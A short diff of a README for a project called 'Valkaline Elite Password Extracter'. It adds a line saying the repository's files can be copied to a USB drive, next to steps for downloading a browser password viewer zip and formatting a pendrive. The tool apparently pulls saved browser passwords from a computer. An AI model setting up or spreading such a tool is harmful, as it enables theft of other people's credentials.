@@ -1,5 +1,6 @@
 # Valkaline
 VALKALINE ELITE PASSWORD EXTRACTER
+(you can simply download the whole files from the VALKALINE folder in the rep. and place them in your usb too!! it works...)
 
 Download the Web browser pass view Zip file given in rep and then insert your Pendrive to your computer and format it as NTFS (Quick Format)
 
